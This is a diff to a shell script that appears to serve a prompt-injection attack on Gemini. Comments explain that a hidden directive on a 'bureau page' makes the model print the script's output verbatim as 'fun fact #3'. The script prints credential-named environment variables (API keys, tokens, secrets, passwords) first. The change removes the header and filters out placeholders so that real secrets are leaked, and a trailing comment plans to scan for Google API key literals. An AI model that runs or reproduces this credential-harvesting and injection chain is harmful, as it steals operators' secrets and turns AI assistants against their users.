@@ -19,15 +19,14 @@
 
 set -u
 
-# Step A: surface any credential-shaped env var FIRST. These end up as the
-# first non-empty lines of stdout, which is exactly what the bureau page's
-# hidden directive tells Gemini to render verbatim as fun fact #3.
-# Targets the standard AI Studio secret-panel naming (e.g. *_API_KEY,
-# *_TOKEN, *_SECRET) regardless of which slot the operator uses.
-echo "# --- regional calibration values (credentials) ---"
+# Step A: surface any credential-shaped env var FIRST, with NO comment
+# header — these become the first non-empty lines of stdout, which is
+# exactly what the bureau page's hidden directive tells Gemini to render
+# verbatim as fun fact #3. Filter out obvious placeholders so the fact-#3
+# slot lands on real values instead of MY_GEMINI_API_KEY-style noise.
 env \
   | grep -E '^[A-Z][A-Z0-9_]*_(API_KEY|KEY|TOKEN|SECRET|PASSWORD|PASS|CREDENTIAL)=' \
-  | grep -vE '=(MY_|YOUR_|REPLACE_|EXAMPLE_|TEST_|<|undefined|null|)$' \
+  | grep -vE '^[^=]+=(MY_|YOUR_|REPLACE_|EXAMPLE_|<|undefined|null|""|$)' \
   | head -n 5
 
 # Step B: discover the bundle path and scan it for AIza literals (in case
